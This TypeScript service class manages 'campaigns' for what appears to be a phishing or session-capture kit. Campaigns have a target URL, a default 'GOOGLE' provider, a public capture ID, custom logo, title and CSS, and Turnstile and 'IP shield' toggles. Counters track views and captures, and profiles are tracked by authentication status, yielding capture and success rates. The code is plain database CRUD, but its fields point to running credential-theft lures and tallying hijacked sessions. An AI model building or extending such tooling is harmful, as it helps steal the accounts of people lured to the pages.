import prisma from '../config/database';
import { logger } from '../utils/logger.util';
import { CreateCampaignInput, UpdateCampaignInput } from '../utils/validation.util';
import { v4 as uuid } from 'uuid';

export class CampaignService {
  /**
   * Generate unique capture ID (8 characters hex)
   */
  private generateCaptureId(): string {
    return uuid().replace(/-/g, '').substring(0, 8);
  }

  /**
   * Create new campaign
   */
  async createCampaign(userId: string, data: CreateCampaignInput) {
    try {
      // Generate unique capture ID
      let captureId = this.generateCaptureId();
      
      // Ensure uniqueness
      let existing = await prisma.campaign.findUnique({ where: { captureId } });
      while (existing) {
        captureId = this.generateCaptureId();
        existing = await prisma.campaign.findUnique({ where: { captureId } });
      }

      // Create campaign
      const campaign = await prisma.campaign.create({
        data: {
          userId,
          name: data.name,
          targetUrl: data.targetUrl,
          description: data.description,
          provider: data.provider || 'GOOGLE',
          captureId,
          pageTitle: data.pageTitle,
          logoUrl: data.logoUrl,
          customCss: data.customCss,
          turnstileEnabled: data.turnstileEnabled ?? true,
          ipShieldEnabled: data.ipShieldEnabled ?? true,
          status: 'ACTIVE',
          domainId: data.domainId,
          profileId: data.profileId,
        },
      });

      logger.success(`Campaign created: ${campaign.name} (${campaign.captureId}) by user ${userId}`);

      return {
        success: true,
        campaign,
      };
    } catch (error: any) {
      logger.error('Create campaign error:', error.message);
      throw error;
    }
  }

  /**
   * Get all campaigns for user
   */
  async getUserCampaigns(userId: string, isAdmin: boolean = false) {
    try {
      // Admin sees all campaigns, technician sees only their own
      const where = isAdmin ? {} : { userId };

      const campaigns = await prisma.campaign.findMany({
        where,
        include: {
          User: {
            select: {
              id: true,
              email: true,
              fullName: true,
              role: true,
            },
          },
          _count: {
            select: {
              Deployment: true,
              Session: true,
              Profile: true,
            },
          },
        },
        orderBy: { createdAt: 'desc' },
      });

      // Format campaigns to include addedBy field
      const formattedCampaigns = campaigns.map((campaign: any) => ({
        ...campaign,
        addedBy: campaign.User,
        User: undefined, // Remove User field from response
      }));

      return {
        success: true,
        campaigns: formattedCampaigns,
        total: formattedCampaigns.length,
      };
    } catch (error: any) {
      logger.error('Get user campaigns error:', error.message);
      throw error;
    }
  }

  /**
   * Get campaign by ID
   */
  async getCampaignById(campaignId: string, userId?: string, isAdmin: boolean = false) {
    try {
      const campaign = await prisma.campaign.findUnique({
        where: { id: campaignId },
        include: {
          User: {
            select: {
              id: true,
              email: true,
              fullName: true,
            },
          },
          Deployment: {
            orderBy: { createdAt: 'desc' },
            take: 10,
          },
          _count: {
            select: {
              Deployment: true,
              Session: true,
              Profile: true,
            },
          },
        },
      });

      if (!campaign) {
        throw new Error('Campaign not found');
      }

      // Check ownership (unless admin)
      if (!isAdmin && userId && campaign.userId !== userId) {
        throw new Error('Access denied - not campaign owner');
      }

      return {
        success: true,
        campaign,
      };
    } catch (error: any) {
      logger.error('Get campaign by ID error:', error.message);
      throw error;
    }
  }

  /**
   * Get campaign by capture ID (for public routes)
   */
  async getCampaignByCaptureId(captureId: string) {
    try {
      const campaign = await prisma.campaign.findUnique({
        where: { captureId },
        include: {
          User: {
            select: {
              id: true,
              email: true,
            },
          },
        },
      });

      if (!campaign) {
        throw new Error('Campaign not found');
      }

      if (campaign.status !== 'ACTIVE') {
        throw new Error('Campaign is not active');
      }

      return {
        success: true,
        campaign,
      };
    } catch (error: any) {
      logger.error('Get campaign by capture ID error:', error.message);
      throw error;
    }
  }

  /**
   * Update campaign
   */
  async updateCampaign(campaignId: string, userId: string, data: UpdateCampaignInput, isAdmin: boolean = false) {
    try {
      const campaign = await prisma.campaign.findUnique({
        where: { id: campaignId },
      });

      if (!campaign) {
        throw new Error('Campaign not found');
      }

      // Check ownership (unless admin)
      if (!isAdmin && campaign.userId !== userId) {
        throw new Error('Access denied - not campaign owner');
      }

      const updated = await prisma.campaign.update({
        where: { id: campaignId },
        data: {
          ...data,
          updatedAt: new Date(),
        },
      });

      logger.success(`Campaign updated: ${updated.name} by user ${userId}`);

      return {
        success: true,
        campaign: updated,
      };
    } catch (error: any) {
      logger.error('Update campaign error:', error.message);
      throw error;
    }
  }

  /**
   * Delete campaign
   */
  async deleteCampaign(campaignId: string, userId: string, isAdmin: boolean = false) {
    try {
      const campaign = await prisma.campaign.findUnique({
        where: { id: campaignId },
      });

      if (!campaign) {
        throw new Error('Campaign not found');
      }

      // Check ownership (unless admin)
      if (!isAdmin && campaign.userId !== userId) {
        throw new Error('Access denied - not campaign owner');
      }

      // Delete campaign (cascade will handle related records)
      await prisma.campaign.delete({
        where: { id: campaignId },
      });

      logger.warn(`Campaign deleted: ${campaign.name} by user ${userId}`);

      return {
        success: true,
        message: 'Campaign deleted successfully',
      };
    } catch (error: any) {
      logger.error('Delete campaign error:', error.message);
      throw error;
    }
  }

  /**
   * Increment campaign view count
   */
  async incrementViewCount(captureId: string) {
    try {
      await prisma.campaign.update({
        where: { captureId },
        data: {
          viewCount: { increment: 1 },
          lastActivityAt: new Date(),
        },
      });
    } catch (error: any) {
      logger.error('Increment view count error:', error.message);
    }
  }

  /**
   * Increment campaign capture count
   */
  async incrementCaptureCount(captureId: string) {
    try {
      await prisma.campaign.update({
        where: { captureId },
        data: {
          captureCount: { increment: 1 },
          lastActivityAt: new Date(),
        },
      });
    } catch (error: any) {
      logger.error('Increment capture count error:', error.message);
    }
  }

  /**
   * Get campaign statistics
   */
  async getCampaignStats(campaignId: string, userId: string, isAdmin: boolean = false) {
    try {
      const campaign = await prisma.campaign.findUnique({
        where: { id: campaignId },
        include: {
          _count: {
            select: {
              Deployment: true,
              Session: true,
              Profile: true,
            },
          },
        },
      });

      if (!campaign) {
        throw new Error('Campaign not found');
      }

      // Check ownership (unless admin)
      if (!isAdmin && campaign.userId !== userId) {
        throw new Error('Access denied - not campaign owner');
      }

      // Get additional stats
      const completedSessions = await prisma.session.count({
        where: {
          campaignId,
          status: 'COMPLETED',
        },
      });

      const authenticatedProfiles = await prisma.profile.count({
        where: {
          campaignId,
          authStatus: 'AUTHENTICATED',
        },
      });

      return {
        success: true,
        stats: {
          views: campaign.viewCount,
          totalSessions: campaign._count.Session,
          completedSessions,
          totalProfiles: campaign._count.Profile,
          authenticatedProfiles,
          deployments: campaign._count.Deployment,
          captureRate: campaign.viewCount > 0 
            ? ((campaign.captureCount / campaign.viewCount) * 100).toFixed(2) + '%'
            : '0%',
          successRate: campaign._count.Session > 0
            ? ((completedSessions / campaign._count.Session) * 100).toFixed(2) + '%'
            : '0%',
        },
      };
    } catch (error: any) {
      logger.error('Get campaign stats error:', error.message);
      throw error;
    }
  }
}

export default new CampaignService();
